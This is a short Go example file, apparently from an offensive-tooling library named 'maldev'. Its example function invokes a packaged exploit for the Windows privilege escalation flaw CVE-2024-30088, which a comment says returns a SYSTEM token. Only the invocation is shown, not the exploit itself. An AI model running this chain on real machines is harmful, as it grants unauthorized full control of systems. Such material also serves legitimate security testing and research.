//go:build windows && amd64

package cve202430088_test

import (
	"context"
	"fmt"
	"time"

	"github.com/oioio-space/maldev/privesc/cve202430088"
)

// Run executes the CVE-2024-30088 LPE chain and returns a SYSTEM
// token. Build-tagged so the chain doesn't ship in release builds
// unless explicitly opted in.
func ExampleRun() {
	ctx, cancel := context.WithTimeout(context.Background(), 30*time.Second)
	defer cancel()
	res, err := cve202430088.Run(ctx)
	if err != nil {
		fmt.Println("exploit:", err)
		return
	}
	fmt.Printf("status=%v\n", res.Status)
}
